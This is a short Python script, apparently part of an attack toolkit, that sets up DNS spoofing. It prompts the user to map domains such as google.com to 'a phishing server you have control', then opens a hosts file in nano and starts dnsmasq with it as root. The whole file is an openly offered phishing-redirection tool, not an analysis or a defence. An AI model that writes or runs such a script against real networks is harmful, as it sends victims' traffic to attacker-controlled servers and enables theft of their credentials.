import os
import time

def configDNS(): # Config DNS!
  os.system("clear")
  print("""We need to edit hosts file in order to configurate our DNS server. This is the basic syntax:

  IP.ADRR domain

  #####################
  Ex:
  10.0.0.1 google.com
  #####################

  Change IP addres to a phishing server you have control...

  Now we are going to edit /config/hosts with nano (Save with CTRL + X)
  """)
  rode = input("Continue?(y/n) --> ")
  if rode == "y":
    os.system("clear")
    os.system("nano config/hosts.txt")
    os.system("clear")
    print("Ok, done!")
    time.sleep(1)
    os.system("clear")
  elif rode == "n":
    os.system("clear")
    print("Back to menu...")
    time.sleep(1)
    os.system("clear")
    os.system("python creator/attacks/main.py")
  else:
    os.system("clear")
    print("Yes(y) or No(n).")
    time.sleep(1)
    configDNS()

def startDNS(): # Start DNS!
  os.system("clear")
  print("Starting DNS server...")
  time.sleep(1)
  os.system("dnsmasq -K -H config/hosts &")
  os.system("clear")
  print("Ok, done, DNS server is working!")
  time.sleep(1.5)
  os.system("clear")
  print("Back to menu...")
  time.sleep(1)
  os.system("clear")
  os.system("python creator/attacks/main.py")

def noroot(): # noRoot
  os.system("clear")
  print("RUN AS ROOT!")
  time.sleep(2)
  exit()

def main():
  configDNS()
  startDNS()

# Root verification
root = os.geteuid()
if root == 0:
  main()
else:
  noroot()
